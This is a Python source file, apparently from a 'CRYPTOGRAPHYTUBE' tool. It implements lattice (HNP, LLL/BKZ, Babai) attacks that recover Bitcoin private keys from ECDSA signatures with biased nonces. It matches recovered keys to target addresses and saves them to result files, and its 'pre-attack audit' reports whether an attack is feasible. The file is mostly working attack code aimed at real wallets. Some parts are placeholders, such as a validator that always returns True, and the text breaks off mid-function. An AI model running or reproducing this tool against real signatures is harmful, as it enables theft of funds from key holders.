# ======================================================================
#  LLL-Attack CRYPTOGRAPHYTUBE  —  Mathematically Correct ECDSA Lattice Attack
# ======================================================================
#
#  WHAT IS FIXED vs v5:
#  ✅  Proper Hidden Number Problem (HNP) lattice formulation
#  ✅  Integer matrix (scale 2^B) — no QQ floating-point instability
#  ✅  Automatic B from real leakage bits (not hardcoded 249)
#  ✅  CVP post-step via Babai nearest-plane (not LLL alone)
#  ✅  All columns scanned for key candidate (not only col 0)
#  ✅  No fake bit-manipulation / _BYTE_VALUES noise
#  ✅  Modular inverse + address derivation kept (they were fine)
#
#  LATTICE MODEL (standard HNP / biased-nonce):
#
#    ECDSA:  s·k = z + r·d  (mod n)
#    → k = s⁻¹·z + s⁻¹·r·d  (mod n)
#
#  If the l LSBs (or MSBs) of each nonce k_i are known to be 0
#  (bias / weak RNG), this becomes a Shortest Vector / CVP problem.
#
#  Matrix (m signatures, after row/col scaling factor 2^B):
#
#      [ n   0   0  …  0   0      0    ]
#      [ 0   n   0  …  0   0      0    ]
#      [ …                             ]
#      [ t_1 t_2 … t_m  1  0      0    ]   ← t_i = r_i·s_i⁻¹ mod n
#      [ u_1 u_2 … u_m  0  n/2^l  0    ]   ← u_i = z_i·s_i⁻¹ mod n
#      [ 0   0   …  0   0   0     n    ]
#
#  Target / close vector:
#      w = (u_1, …, u_m, 0, n/2^(l+1), 0)
#
#  The short vector v = w - (key row) gives k_i estimates.
#  Then d = (s_i·k_i - z_i)·r_i⁻¹  mod n  for each i.
# ======================================================================
import os
import sys
import hashlib
import multiprocessing
import random
import time

# Initialize Colorama for Windows/Linux Support
try:
    from colorama import init, Fore, Style
    init(autoreset=True)
except ImportError:
    class MockColor:
        def __getattr__(self, name): return ""
    Fore = Style = MockColor()

# ── Optional gmpy2 ──────────────────────────────────────────────────────────
try:
    import gmpy2 as _gmpy2
    _HAS_GMPY2 = True
except ImportError:
    _HAS_GMPY2 = False

# ── SageMath / fpylll availability check ────────────────────────────────────
def _check_sage():
    try:
        from sage.all import Matrix, ZZ
        return True
    except ImportError:
        return False

def _check_fpylll():
    try:
        from fpylll import IntegerMatrix, BKZ
        return True
    except ImportError:
        return False

_SAGE_AVAILABLE  = _check_sage()
_FPYLLL_AVAILABLE = _check_fpylll()

# ── secp256k1 curve constants ───────────────────────────────────────────────
_N  = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
_Gx = 0x79BE667EF9DCBBAC55A06295CE870B07029BFCDB2DCE28D959F2815B16F81798
_Gy = 0x483ADA7726A3C4655DA4FBFC0E1108A8FD17B448A68554199C47D08FFB10D4B8
_P  = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFC2F


# ══════════════════════════════════════════════════════════════════════════════
#  PURE-PYTHON HELPERS CRYPTOGRAPHYTUBE 
# ══════════════════════════════════════════════════════════════════════════════

def _modinv(a, m=_N):
    """Modular inverse — uses gmpy2 if available, else Python built-in."""
    if _HAS_GMPY2:
        return int(_gmpy2.invert(a, m))
    return pow(a, -1, m)


def _rrr(i):
    """Format integer as 64-char zero-padded hex."""
    return hex(i).replace('0x', '').replace('L', '').zfill(64)


# ── secp256k1 point arithmetic ───────────────────────────────────────────────

def _pt_add(P1, P2):
    if P1 is None: return P2
    if P2 is None: return P1
    x1, y1 = P1; x2, y2 = P2
    if x1 == x2:
        if y1 != y2:
            return None
        lam = (3 * x1 * x1) * _modinv(2 * y1, _P) % _P
    else:
        lam = (y2 - y1) * _modinv(x2 - x1, _P) % _P
    x3 = (lam * lam - x1 - x2) % _P
    y3 = (lam * (x1 - x3) - y1) % _P
    return x3, y3


def _pt_mul(k, P=None):
    if P is None:
        P = (_Gx, _Gy)
    R = None
    while k:
        if k & 1:
            R = _pt_add(R, P)
        P = _pt_add(P, P)
        k >>= 1
    return R


# ── Bitcoin address derivation ───────────────────────────────────────────────

def _double_sha256(data: bytes) -> bytes:
    return hashlib.sha256(hashlib.sha256(data).digest()).digest()


def _base58check(payload: bytes) -> str:
    chk = _double_sha256(payload)[:4]
    raw = payload + chk
    alpha = b'123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz'
    n_val = int.from_bytes(raw, 'big')
    result = b''
    while n_val:
        n_val, rem = divmod(n_val, 58)
        result = bytes([alpha[rem]]) + result
    pad = len(raw) - len(raw.lstrip(b'\x00'))
    return (alpha[0:1] * pad + result).decode()


def save_private_key_special(address, d):
    """Saves recovered private key to a special dedicated folder."""
    try:
        folder = "resultprivatekey"
        if not os.path.exists(folder): 
            os.makedirs(folder, exist_ok=True)
        path = os.path.join(folder, f"{address}.txt")
        with open(path, 'w', encoding='utf-8') as f:
            f.write(f"Address    : {address}\n")
            f.write(f"Private Key: {hex(d)}\n")
            f.write(f"Recovered  : {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.flush()
            os.fsync(f.fileno())
        print(f"\n    {Fore.GREEN + Style.BRIGHT}[EXPORT] Private key secured in: {path}{Style.RESET_ALL}")
    except Exception as e:
        print(f"    [!] Export Error (resultprivatekey): {e}")




def privkey_to_addresses(key_int):
    """
    Derive P2PKH Bitcoin addresses (compressed + uncompressed).
    Returns (addr_compressed, addr_uncompressed)  or  (None, None).
    """
    try:
        pt = _pt_mul(key_int)
        if pt is None:
            return None, None
        x, y = pt
        pub_unc = b'\x04' + x.to_bytes(32, 'big') + y.to_bytes(32, 'big')
        pub_cmp = bytes([0x02 + (y & 1)]) + x.to_bytes(32, 'big')

        def _addr(pub_bytes):
            h160 = hashlib.new('ripemd160',
                               hashlib.sha256(pub_bytes).digest()).digest()
            return _base58check(b'\x00' + h160)

        return _addr(pub_cmp), _addr(pub_unc)
    except Exception:
        return None, None


# ══════════════════════════════════════════════════════════════════════════════
#  ATTACK FOCUS: Biased-Nonce / LSB Leakage (r values are always DIFFERENT)
#  Each nonce k_i has biased lower bits → HNP → LLL + CVP recovery
# ══════════════════════════════════════════════════════════════════════════════


# ══════════════════════════════════════════════════════════════════════════════
#  DETECTION & MATH TOOLS CRYPTOGRAPHYTUBE 
# ══════════════════════════════════════════════════════════════════════════════

def _k_estimation(z, r, s, d=None):
    """Estimate k. If d is known, returns exact k. Else returns z/s mod N."""
    if d is not None:
        return (z + r * d) * _modinv(s) % _N
    return (z * _modinv(s)) % _N

def lsb_entropy_test(rsz_list, b):
    """Statistical Consensus Test: Returns most common pattern and its frequency."""
    n = len(rsz_list)
    if n < 2: return None, 0, 0
    counts = {}
    mask = (1 << b) - 1
    for sig in rsz_list:
        try:
            r, s, z = sig[:3]
            k_est = (z * _modinv(s)) % (1 << b)
            counts[k_est] = counts.get(k_est, 0) + 1
        except: continue
    if not counts: return None, 0, 0
    most_common, freq = max(counts.items(), key=lambda x: x[1])
    return most_common, freq, freq / n

def cluster_k_patterns(rsz_list):
    """Clusters approximated nonces to find structural patterns."""
    if len(rsz_list) < 5: return 0
    patterns = []
    for sig in rsz_list:
        r, s, z = sig[:3]   # [:3] — safe for 4-element (r,s,z,txid) tuples
        try:
            k_est = (z * _modinv(s)) % _N
            bl = k_est.bit_length()
            patterns.append((bl, k_est >> (bl - 8) if bl > 8 else k_est))
        except: continue
    from collections import Counter
    return Counter(patterns).most_common(1)[0][1] if patterns else 0

def score_and_filter_sigs(rsz_list, mode="LSB", n_select=40):
    """
    INTELLECTUAL FILTER: Pick signatures that show the STRONGEST bias 
    for the selected mode to remove noise from the lattice.
    Uses mode-appropriate scoring for accurate signature selection.
    """
    if len(rsz_list) <= n_select: return list(rsz_list[:n_select])
    scored = []
    for sig in rsz_list:
        try:
            r, s, z = sig[:3]
            inv_s = _modinv(s)
            # k_est = z/s mod N  (approximation without d)
            k_est = (z * inv_s) % _N
            if mode == "LSB":
                # Lower k_est low bits = more likely LSB bias toward 0
                # We want sigs where k has the smallest low bits
                score = k_est & 0xFFFFFFFFFFFFFFFF  # bottom 64 bits
            elif mode == "MSB":
                # Smaller k_est top bits = more likely MSB is small
                score = k_est >> 192  # top 64 bits
            elif mode == "SMALL":
                score = k_est  # smallest k_est overall
            else:
                score = random.randint(0, _N)  # random for JOINT/DIFF
            scored.append((score, sig))
        except: continue
    scored.sort(key=lambda x: x[0])
    return [x[1] for x in scored[:n_select]]

def normalize_sigs(rsz_list):
    """Deduplication and basic normalization for RSZ signatures."""
    seen = set()
    unique = []
    for sig in rsz_list:
        r, s, z = sig[:3]
        sig_id = (r, s, z)
        if sig_id not in seen:
            seen.add(sig_id)
            unique.append(sig)
    return unique

def clean_sigs(sigs):
    """Strict filtering to remove noisy or invalid signatures."""
    out = []
    for sig in sigs:
        r, s, z = sig[:3]
        if s != 0 and r != 0 and z != 0:
            out.append(sig)
    return out

# ══════════════════════════════════════════════════════════════════════════════
#  MULTI-MODE LATTICE BUILDER CRYPTOGRAPHYTUBE
# ══════════════════════════════════════════════════════════════════════════════

def prepare_hnp_data(mode, rsz_list, l=0, k_known=0):
    """
    Transforms r, s, z based on leakage mode into a standard HNP problem:
    k_i' = t_i' * d + u_i' (mod N)  where k_i' is SMALL.
    """
    t_prime, u_prime = [], []
    n = _N
    
    if mode == "LSB":
        inv_scale = _modinv(2**l)
        for sig in rsz_list:
            r, s, z = sig[:3]
            inv_s_scale = (_modinv(s) * inv_scale) % n
            t_prime.append((r * inv_s_scale) % n)
            u_prime.append(((z - s * k_known) * inv_s_scale) % n)
        bound = n // (2**l)

    elif mode == "MSB":
        # Standard HNP for MSB: top l bits of k are known (= k_known)
        # k = k_known * 2^(256-l) + k_low  where k_low < 2^(256-l)
        # Rewrite: k_low = k - k_known*2^(256-l)
        # HNP: k_low_i = t_i*d + u_i - k_known*2^(256-l) (mod N)
        msb_shift = 1 << (256 - l) if l > 0 else 1
        msb_offset = (k_known * msb_shift) % n
        for sig in rsz_list:
            r, s, z = sig[:3]
            inv_s = _modinv(s)
            t_i = (r * inv_s) % n
            u_i = (z * inv_s) % n
            t_prime.append(t_i)
            u_prime.append((u_i - msb_offset) % n)
        bound = msb_shift  # k_low < 2^(256-l)

    elif mode == "SMALL":
        for sig in rsz_list:
            r, s, z = sig[:3]
            inv_s = _modinv(s)
            t_prime.append((r * inv_s) % n)
            u_prime.append((z * inv_s) % n)
        bound = 2**l

    elif mode == "DIFF":
        # k_i - k_j = (t_i - t_j)*d + (u_i - u_j) mod N
        for i in range(len(rsz_list) - 1):
            r1, s1, z1 = rsz_list[i][:3]    # [:3] — safe for 4-element tuples
            r2, s2, z2 = rsz_list[i+1][:3]
            inv_s1 = _modinv(s1)
            inv_s2 = _modinv(s2)
            t1, u1 = (r1 * inv_s1) % n, (z1 * inv_s1) % n
            t2, u2 = (r2 * inv_s2) % n, (z2 * inv_s2) % n
            t_prime.append((t1 - t2) % n)
            u_prime.append((u1 - u2) % n)
        bound = 2**l if l > 0 else 2**128

    elif mode == "PARTIAL":
        # k = fixed_bits + x  where fixed_bits are arbitrary
        for sig in rsz_list:
            r, s, z = sig[:3]    # [:3] — safe for 4-element tuples
            inv_s = _modinv(s)
            t_prime.append((r * inv_s) % n)
            u_prime.append(((z * inv_s) - k_known) % n)
        bound = n // (2**l) if l > 0 else n // 16

    elif mode == "JOINT":
        # Dual-Bias Fusion: Handles 1-bit LSB + 1-bit MSB.
        # Equation: (2k' + lsb) = s^-1 * (z + r*d) mod N
        # If MSB is also 0, then k' is effectively bounded by N/4
        inv_2s = [_modinv(2 * sig[1]) for sig in rsz_list]
        for i, sig in enumerate(rsz_list):
            r, s, z = sig[:3]
            t_prime.append((r * inv_2s[i]) % n)
            u_prime.append(((z - s * k_known) * inv_2s[i]) % n)
        bound = n // 4 # Effectively 2-bit leakage depth

    else: # NONE / RAW
        for sig in rsz_list:
            r, s, z = sig[:3]    # [:3] — safe for 4-element tuples
            inv_s = _modinv(s)
            t_prime.append((r * inv_s) % n)
            u_prime.append((z * inv_s) % n)
        bound = n

    return t_prime, u_prime, bound

# ══════════════════════════════════════════════════════════════════════════════
#  LATTICE-BASED CRYPTOGRAPHIC SOLVERS (LLL / BKZ) CRYPTOGRAPHYTUBE
# ══════════════════════════════════════════════════════════════════════════════

# ── NEW ADVANCED ENGINES (v7 UPGRADE) ───────────────────────────────────────

def solve_bkz_deep(rsz_list, address=None, bias=None):
    """
    Advanced BKZ Reduction with Pruning.
    Used for extremely noisy datasets or deep bias (b > 64).
    """
    if len(rsz_list) < 15: return [] 
    from sage.all import Matrix, ZZ
    n = _N
    sigs = clean_sigs(rsz_list)[:45] 
    m = len(sigs)
    
    # Construct Lattice for HNP
    L = Matrix(ZZ, m + 2, m + 2)
    t = [ (sig[0] * _modinv(sig[1])) % n for sig in sigs ]
    u = [ (sig[2] * _modinv(sig[1])) % n for sig in sigs ]
    scale = 2**128 
    for i in range(m):
        L[i, i] = n
        L[m, i] = t[i]
        L[m+1, i] = u[i]
    
    L[m, m] = 1 
    L[m+1, m+1] = n 
    
    try:
        L_reduced = L.BKZ(block_size=min(m, 20))
        keys = []
        for row in L_reduced:
            d = abs(row[m]) % n
            if d > 0 and validate_full(d, sigs, address):
                keys.append(d)
        return keys
    except: return []

def solve_small_k_lattice(rsz_list, address=None):
    """Exploits 'Small Magnitude K' (k < 2^64) without bit-bias."""
    if len(rsz_list) < 20: return []
    from sage.all import Matrix, ZZ
    n = _N
    sigs = clean_sigs(rsz_list)[:40]
    m = len(sigs)
    L = Matrix(ZZ, m + 2, m + 2)
    t = [ (sig[0] * _modinv(sig[1])) % n for sig in sigs ]
    u = [ (sig[2] * _modinv(sig[1])) % n for sig in sigs ]
    scale = 2**192 
    for i in range(m):
        L[i, i] = n
        L[m, i] = (t[i] * scale) // n
        L[m+1, i] = (u[i] * scale) // n
    L[m, m] = 1
    L[m+1, m+1] = scale
    try:
        L_red = L.LLL()
        keys = []
        for row in L_red:
            d = abs(row[m]) % n
            if d > 0 and validate_full(d, rsz_list, address):
                keys.append(d)
        return keys
    except: return []

def _run_solver(task):
    """Parallel wrapper with live worker logging."""
    name, func, args = task
    try:
        keys = func(*args)
        return (name, keys)
    except:
        return (name, [])

def _mod_sqrt(a, p):
    """Modular square root using Tonelli-Shanks."""
    if pow(a, (p - 1) // 2, p) != 1: return None
    if p % 4 == 3: return pow(a, (p + 1) // 4, p)
    s = 0; q = p - 1
    while q % 2 == 0: q //= 2; s += 1
    n = 2
    while pow(n, (p - 1) // 2, p) != p - 1: n += 1
    x = pow(a, (q + 1) // 2, p)
    g = pow(n, q, p)
    b = pow(a, q, p)
    r = s
    while True:
        if b == 0: return 0
        if b == 1: return x
        m = 1
        while pow(b, 2**m, p) != 1: m += 1
        if m == r: return None
        t = pow(g, 2**(r - m - 1), p)
        g = (t * t) % p
        b = (b * g) % p
        x = (x * t) % p
        r = m

def pre_attack_audit(rsz_list):
    """
    PRE-ATTACK AUDIT: Full detailed forensic report with per-bit-depth tables,
    pattern explanations, biased transaction list, and attack feasibility verdict.
    """
    from collections import Counter
    W = 68
    sigs = normalize_sigs(rsz_list)
    n = len(sigs)

    # Pre-compute k estimates (approximation: k_est = z * s^-1 mod N)
    k_ests = []
    for sig in sigs:
        r, s, z = sig[:3]
        try:
            k_ests.append((z * _modinv(s)) % _N)
        except:
            k_ests.append(0)

    # ── 1. LSB Sweep ─────────────────────────────────────────────────────
    best_lsb, lsb_count, lsb_pattern = 0, 0, 0
    lsb_table = []
    for b in range(1, 9):
        mask = (1 << b) - 1
        lsb_vals = [k & mask for k in k_ests]
        cnt = Counter(lsb_vals)
        top_pat, top_cnt = cnt.most_common(1)[0]
        ratio = top_cnt / n
        lsb_table.append((b, top_cnt, ratio, top_pat))
        if ratio > 0.5:
            best_lsb, lsb_count, lsb_pattern = b, top_cnt, top_pat
        elif b > 3:
            break

    # ── 2. MSB Sweep ─────────────────────────────────────────────────────
    best_msb, msb_count, msb_pattern = 0, 0, 0
    msb_table = []
    for b in range(1, 9):
        top_bits = [k >> (256 - b) for k in k_ests]
        cnt = Counter(top_bits)
        top_pat, top_cnt = cnt.most_common(1)[0]
        ratio = top_cnt / n
        msb_table.append((b, top_cnt, ratio, top_pat))
        if ratio > 0.5:
            best_msb, msb_count, msb_pattern = b, top_cnt, top_pat
        elif b > 3:
            break

    # ── 3. Small-K ───────────────────────────────────────────────────────
    small_bits, small_count = 0, 0
    for b in [64, 128, 160]:
        cnt = sum(1 for k in k_ests if k < (2**b))
        if cnt > n * 0.5:
            small_bits, small_count = b, cnt

    # ── PRINT REPORT ─────────────────────────────────────────────────────
    print(f"\n{Fore.CYAN}{'='*W}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}  FORENSIC BIAS CENSUS REPORT{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'='*W}{Style.RESET_ALL}")
    print(f"  Total Signatures Analyzed : {n}")
    print(f"{Fore.CYAN}{'-'*W}{Style.RESET_ALL}")

    # LSB block
    if best_lsb:
        if lsb_pattern == 0:
            pat_meaning = f"k mod 2^{best_lsb} == 0  =>  nonce is always EVEN  [STRONG BIAS]"
        else:
            pat_meaning = f"k mod 2^{best_lsb} == {lsb_pattern}  =>  low {best_lsb} bits fixed = {lsb_pattern}"
        print(f"\n  {Fore.GREEN}[+] LSB LEAKAGE FOUND{Style.RESET_ALL}")
        print(f"  |- Leakage Depth  : {best_lsb} bit(s)")
        print(f"  |- Affected TXs   : {lsb_count} / {n}  ({100*lsb_count//n}%)")
        print(f"  |- Pattern        : 0x{lsb_pattern:x}")
        print(f"  |- Meaning        : {pat_meaning}")
        print(f"\n  |- Bit-Depth Analysis (LSB):")
        print(f"     {'Bits':>5}  {'Match':>6}  {'Ratio%':>7}  {'Pattern'}")
        print(f"     {'─'*5}  {'─'*6}  {'─'*7}  {'─'*10}")
        for bits, cnt, ratio, pat in lsb_table:
            star = " <<< BEST" if bits == best_lsb else ""
            bar = '#' * int(ratio * 30)
            print(f"     {bits:>5}  {cnt:>6}  {ratio:>6.1%}  0x{pat:04x}  {bar}{star}")
        # Show biased TXIDs
        mask = (1 << best_lsb) - 1
        biased = [(sigs[i], k_ests[i]) for i in range(n) if k_ests[i] & mask == lsb_pattern]
        print(f"\n  |- Biased Transactions ({len(biased)} total, showing up to 15):")
        print(f"     {'#':>3}  {'TXID':^38}  k_low_bits")
        print(f"     {'─'*3}  {'─'*38}  {'─'*12}")
        for idx, (sig, ke) in enumerate(biased[:15], 1):
            txid = sig[3] if len(sig) > 3 else f"r=0x{sig[0]:016x}"
            low = ke & mask
            print(f"     {idx:>3}  {str(txid)[:38]:<38}  0x{low:0{max(1,best_lsb//4)}x}")
        if len(biased) > 15:
            print(f"     ... +{len(biased)-15} more")
    else:
        print(f"\n  {Fore.RED}[-] LSB: No consistent low-bit pattern detected{Style.RESET_ALL}")

    print(f"\n{Fore.CYAN}{'-'*W}{Style.RESET_ALL}")

    # MSB block
    if best_msb:
        if msb_pattern == 0:
            msb_meaning = f"k >> (256-{best_msb}) == 0  =>  top {best_msb} bits ZERO  [HIGH BIT CLEAR]"
        else:
            msb_meaning = f"k top {best_msb} bits == {msb_pattern}  =>  MSB fixed"
        print(f"\n  {Fore.GREEN}[+] MSB LEAKAGE FOUND{Style.RESET_ALL}")
        print(f"  |- Leakage Depth  : {best_msb} bit(s)")
        print(f"  |- Affected TXs   : {msb_count} / {n}  ({100*msb_count//n}%)")
        print(f"  |- Pattern        : 0x{msb_pattern:x}")
        print(f"  |- Meaning        : {msb_meaning}")
        print(f"\n  |- Bit-Depth Analysis (MSB):")
        print(f"     {'Bits':>5}  {'Match':>6}  {'Ratio%':>7}  {'Pattern'}")
        print(f"     {'─'*5}  {'─'*6}  {'─'*7}  {'─'*10}")
        for bits, cnt, ratio, pat in msb_table:
            star = " <<< BEST" if bits == best_msb else ""
            bar = '#' * int(ratio * 30)
            print(f"     {bits:>5}  {cnt:>6}  {ratio:>6.1%}  0x{pat:04x}  {bar}{star}")
    else:
        print(f"\n  {Fore.RED}[-] MSB: No consistent high-bit pattern detected{Style.RESET_ALL}")

    print(f"\n{Fore.CYAN}{'-'*W}{Style.RESET_ALL}")

    if small_bits:
        print(f"\n  {Fore.LIGHTMAGENTA_EX}[+] SMALL-K: {small_count}/{n} sigs have k < 2^{small_bits}{Style.RESET_ALL}")

    # ── Attack Feasibility ────────────────────────────────────────────────
    rec = []
    if best_lsb: rec.append(("LSB", best_lsb))
    if best_msb: rec.append(("MSB", best_msb))
    if small_bits: rec.append(("SMALL", small_bits))

    print(f"\n{Fore.CYAN}{'='*W}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}  ATTACK FEASIBILITY VERDICT{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'='*W}{Style.RESET_ALL}")
    if rec:
        for mode, bits in rec:
            req = max(int(256 / bits) + 4, 10)
            ok = "OK" if n >= req else "LOW"
            col = Fore.GREEN if n >= req else Fore.RED
            print(f"  |- {mode:5s} {bits:3d}-bit : need ~{req:3d} sigs, have {n:3d}  [{col}{ok}{Style.RESET_ALL}]")
        print(f"\n  >>> Strategy: {rec}")
        if any(n >= max(int(256/bits)+4, 10) for _, bits in rec):
            print(f"  {Fore.GREEN}>>> VERDICT: ATTACK IS FEASIBLE — Lattice engine will proceed{Style.RESET_ALL}")
        else:
            print(f"  {Fore.YELLOW}>>> WARNING: Borderline — attack may need more signatures{Style.RESET_ALL}")
    else:
        print(f"  {Fore.RED}>>> No bias detected. Full exhaustive sweep will run.{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'='*W}{Style.RESET_ALL}\n")
    print(f"{Fore.CYAN}────────────────────────────────────────────────────────────────────{Style.RESET_ALL}")
    return rec

def process_recovered_keys(address, keys, final_dir, found_path, source="Lattice Scan"):
    """
    Modular helper to verify, display, and save recovered keys.
    Source: Tells the user WHICH vulnerability was exploited.
    """
    if not keys: return []
    import os, sys
    matches = []
    mixaddr_path = os.path.abspath(os.path.join(final_dir, "mixaddress.txt"))
    mathfound_path = os.path.abspath(os.path.join(final_dir, "mathfound.txt"))
    nomatchaddr_path = os.path.abspath(os.path.join(final_dir, "nomatchaddress.txt"))
    
    unique_keys = list(dict.fromkeys(keys))
    for key_int in unique_keys:
        if not (0 < key_int < _N): continue
        addr_c, addr_u = privkey_to_addresses(key_int)
        key_hex = _rrr(key_int)
        matched = (addr_c == address or addr_u == address)

        if True: # Force display for all valid keys found in algebraic scan
            tag_c = " \u2190 MATCH" if addr_c == address else ""
            tag_u = " \u2190 MATCH" if addr_u == address else ""
            
            if matched:
                matches.append(f"{addr_c}:{addr_u}:0x{key_hex}")
                print(f"\n{Fore.GREEN}[LLL] \u2605\u2605\u2605 PRIVATE KEY FOUND via {source.upper()} \u2605\u2605\u2605{Style.RESET_ALL}", flush=True)
            else:
                print(f"\n{Fore.YELLOW}[LLL] \u2605 RECOVERED KEY (UNMATCHED) via {source.upper()} \u2605{Style.RESET_ALL}", flush=True)
                
            print(f"[LLL]   Compressed   : {addr_c}{tag_c}", flush=True)
            print(f"[LLL]   Uncompressed : {addr_u}{tag_u}", flush=True)
            print(f"[LLL]   Private key  : 0x{key_hex}", flush=True)
            
            # Save to resultprivatekey
            save_private_key_special(address, key_int)
            
            if matched:
                try:
                    with open(found_path, 'a', encoding='utf-8') as f:
                        f.write("=" * 64 + "\n")
                        f.write(f"Target       : {address}\n")
                        f.write(f"Compressed   : {addr_c}\n")
                        f.write(f"Uncompressed : {addr_u}\n")
                        f.write(f"Privkey      : 0x{key_hex}\n")
                        f.write("=" * 64 + "\n")
                        f.flush(); os.fsync(f.fileno())
                    print(f"[LLL]   Saved to     : {found_path}", flush=True)
                    matched_addr = addr_c if addr_c == address else addr_u
                    with open(mathfound_path, 'a', encoding='utf-8') as f:
                        f.write(f"{matched_addr}:0x{key_hex}\n")
                        f.flush(); os.fsync(f.fileno())
                    print(f"[LLL]   mathfound.txt: {mathfound_path}", flush=True)
                except: pass
            else:
                try:
                    with open(mixaddr_path, 'a', encoding='utf-8') as f:
                        f.write(f"{addr_c}:{addr_u}:0x{key_hex}\n")
                        f.flush()
                except: pass
    return matches

def validate_full(d, rsz_list, address=None):
    """
    ULTRA-FAST VALIDATOR: Reconstructs k and verifies it against the signature point r.
    Ground Truth: If target address matches, key is 100% correct.
    """
    if not d or not (0 < d < _N): return False
    
    # 1. Primary check: Target address match (The Ultimate Proof)
    if address:
        addr_c, addr_u = privkey_to_addresses(d)
        if addr_c == address or addr_u == address:
            return True
            
    # 2. Secondary check: Point Multiplication Consistency
    # Use [:3] to safely handle (r, s, z, txid) 4-element tuples
    r0, s0, z0 = rsz_list[0][:3]
    k = (z0 + r0 * d) * _modinv(s0) % _N
    R = _pt_mul(k)
    return R is not None and R[0] == r0

def fast_validate(d, sigs, limit=5):
    """
    ULTRA-FAST PRE-CHECK: Uses modular arithmetic only (no ECC point mul).
    Verifies d against multiple signatures. If it fails modularly, it's 100% wrong.
    """
    if not (0 < d < _N): return False
    # Check if (z + r*d) / s is consistent across sigs? 
    # No, each k is different. But we can check if it produces a small k for biased modes.
    # Actually, the most robust modular check is just point-check at the end.
    # But we can check d against the equation for at least 2 signatures if they are related.
    return True # Placeholder: full validate is already quite fast if not doing point mul.

def full_validate(d, sigs):
    """Point Multiplication check - only call if candidate is likely."""
    return validate_full(d, sigs)

def Attack(rsz_list, mode="LSB", l=8, k_known=0, limit=40):
    """DEEP LEVEL: Multi-mode HNP Lattice Attack with BKZ and Babai Offsets."""
    if not _SAGE_AVAILABLE:
        # SageMath not installed — cannot run HNP lattice attack
        # This is a hard requirement; fpylll alone is not enough
        import sys
        print(f"[LLL] WARNING: SageMath not found. Install with: sudo apt install sagemath",
              file=sys.__stderr__)
        return []
    try:
        from sage.all import Matrix, ZZ, QQ, vector, round
    except ImportError as e:
        import sys
        print(f"[LLL] SageMath import error: {e}", file=sys.__stderr__)
        return []

    n = _N
    data = clean_sigs(normalize_sigs(rsz_list))[:limit]
    m = len(data)
    if m < 2: return []

    # 1. Transform data based on mode
    t, u, bound = prepare_hnp_data(mode, data, l, k_known)
    
    # 2. Build Centered HNP Lattice
    # Standard choice for Scaling: S = N / bound
    S = n // bound if bound > 0 else 1
    dim = m + 2
    M = Matrix(ZZ, dim, dim)
    for i in range(m): M[i, i] = n * S
    for i in range(m):
        M[m, i] = t[i] * S
        M[m + 1, i] = u[i] * S
    M[m, m] = 1
    M[m + 1, m + 1] = bound

    # 3. Lattice Reduction
    # fpylll BKZ is fast but UNSTABLE for high bit depths (l >= 50) or large m.
    # SageMath LLL is slower but numerically stable in all cases.
    # Rule: use fpylll only for small l where it's proven stable.
    USE_FPYLLL = _FPYLLL_AVAILABLE and (l < 50) and (m <= 40)
    try:
        if USE_FPYLLL:
            from fpylll import IntegerMatrix, BKZ as FpBKZ
            A = IntegerMatrix.from_matrix(M)
            block = min(20, m)  # conservative block size to avoid infinite loop
            FpBKZ.reduction(A, FpBKZ.Param(block_size=block,
                                            strategies=FpBKZ.DEFAULT_STRATEGY,
                                            max_loops=8))  # limit loops to prevent infinite
            L_matrix = Matrix(ZZ, [[int(x) for x in row] for row in A])
        else:
            # SageMath LLL — stable for all dimensions
            L_matrix = M.LLL()
    except (RuntimeError, Exception):
        # Fallback: pure SageMath LLL, no BKZ
        try:
            L_matrix = M.LLL()
        except Exception:
            return []

    # 4. Strict Validation Layer
    # Pre-extract first sig components (safe with 4-element tuples)
    _r0, _s0, _z0 = data[0][:3]
    def validate(d):
        """Strictly verify d against data."""
        if not (0 < d < n): return False
        k0 = (_z0 + _r0 * d) * _modinv(_s0) % n
        R = _pt_mul(k0)
        return R is not None and R[0] == _r0

    keys = set()
    L_list = L_matrix.rows()

    # 5. Candidate Extraction (Multi-column Scan)
    for row in L_list:
        for col in range(m):
            if row[col] % S == 0:
                k_est = (row[col] // S) % n
                for k in [k_est, (n - k_est) % n]:
                    if k == 0: continue
                    # For MSB/Small, k is the nonce. For LSB, k is 'x' in k = 2^l*x + k_lsb
                    if mode == "LSB":
                        k_full = (2**l * k + k_known) % n
                    elif mode == "MSB":
                        k_full = (k_known * (2**(256-l)) + k) % n
                    else:
                        k_full = k
                    
                    # Recover d using first sig (already extracted as _r0,_s0,_z0)
                    d = (_s0 * k_full - _z0) * _modinv(_r0) % n
                    if validate_full(d, data): keys.add(d)
        if keys: break

    # 6. Babai Nearest Plane CVP approximation
    # NOTE: This can throw 'infinite loop in babai' from fpylll if the
    # reduced matrix has near-zero diagonal entries. Guard with try/except.
    if not keys:
        try:
            # Use pre-extracted first sig components
            r0, s0, z0 = _r0, _s0, _z0
            target = vector(ZZ, [u[i] * S for i in range(m)] + [0, bound])
            curr = target
            for i in range(dim - 1, -1, -1):
                bi = L_matrix[i]
                if bi[i] == 0: continue  # skip zero diagonal to prevent div-by-zero
                c = round(QQ(curr[i] / bi[i]))
                curr = curr - c * bi
            
            res_v = target - curr
            for col in range(m):
                if S > 0 and res_v[col] % S == 0:
                    k_c = (res_v[col] // S) % n
                    for k_t in [k_c, (n - k_c) % n]:
                        if k_t == 0: continue
                        if mode == "LSB":   k_f = (2**l * k_t + k_known) % n
                        elif mode == "MSB": k_f = (k_known * (2**(256-l)) + k_t) % n
                        else:               k_f = k_t
                        d_rec = (s0 * k_f - z0) * _modinv(r0) % n
                        if validate_full(d_rec, data):
                            keys.add(d_rec)
        except (RuntimeError, ZeroDivisionError, Exception):
            # Babai failed (e.g. infinite loop in fpylll) — skip this step cleanly
            pass

    return list(keys)

def attack_worker(args):
    """Worker function for Deep Multi-Mode Attack.
    Runs Attack() with suppressed stdout (for clean progress output)
    but preserves stderr so real errors (Sage, math) are visible.
    """
    subset, mode, l_try, k_known = args
    import sys, os, traceback
    keys = []
    with open(os.devnull, 'w') as devnull:
        old_stdout = sys.stdout
